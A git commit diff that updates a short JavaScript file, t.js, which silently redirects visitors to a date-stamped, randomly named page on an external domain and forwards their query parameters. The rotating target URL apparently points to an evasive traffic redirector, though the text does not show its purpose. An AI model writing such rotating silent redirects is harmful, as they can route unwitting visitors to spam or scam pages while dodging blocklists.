977758efd1c99cbc09f7ac12885a669774171982
reyalpilareyalpila <167016503+reyalpilareyalpila@users.noreply.github.com>
2024-08-18 06:09:39 +0800

    Update t.js

--- t.js
+++ t.js
@@ -1,4 +1,4 @@
-var urll="http://static.youguowei.cn/20240817/357a1d9ab1a248228ae2396685232611.html"
+var urll="http://static.youguowei.cn/20240818/2df0f3a3275c4c36aa9ffd95a58a5376.html"
 var params = new URLSearchParams(location.href.split('?')[1]);
   var sjs = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
   window.location.replace(urll + "?" + sjs + "?" + params);
